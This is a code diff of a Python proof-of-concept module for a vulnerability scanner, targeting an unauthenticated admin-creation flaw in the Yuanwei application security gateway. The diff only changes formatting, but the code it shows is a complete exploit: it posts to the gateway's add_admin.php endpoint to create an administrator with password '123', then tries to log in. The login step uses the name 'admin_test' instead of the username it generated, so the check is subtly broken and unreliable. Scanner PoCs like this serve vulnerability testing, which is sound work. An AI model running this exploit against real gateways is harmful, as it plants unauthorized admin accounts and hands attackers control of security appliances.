@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import random
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Yuanwei_0002' # 平台漏洞编号，留空
+    vuln_id = 'Yuanwei_0002'  # 平台漏洞编号，留空
     name = '远为应用安全网关 任意添加管理员'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         远为应用安全网关任意添加管理员。
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '远为应用安全网关'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '8342fe79-4d1f-4871-843b-96c30939f523'
@@ -33,20 +35,21 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             hh = hackhttp.hackhttp()
             arg = self.target
             add_url = arg + '/adminconfig/admin/add_admin.php'
-            username = 'testvul_'+ str(random.randint(111,999))
+            username = 'testvul_' + str(random.randint(111, 999))
             post = 'user_name=' + username + '&strname=&passwd=123&passwd2=123&user_desc=testvul'
             code, head, res, err, _ = hh.http(add_url, post=post)
             if (code != 200) and (code != 302):
                 return False
-            #登录测试
+            # 登录测试
             login_url = arg + '/post_dl.php'
             post = 'name={username}&passwd=123'.format(username='admin_test')
             header = 'Content-Type: application/x-www-form-urlencoded'
-            code, head, res, err, _ = hh.http(login_url, post=post, header=header)
+            code, head, res, err, _ = hh.http(
+                login_url, post=post, header=header)
             #print '++'+res+'++'
             if (code == 200) and (res == '\r\n' or res == '\n' or res == ''):
                 #security_hole('任意添加管理员：' + add_url)
@@ -58,6 +61,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
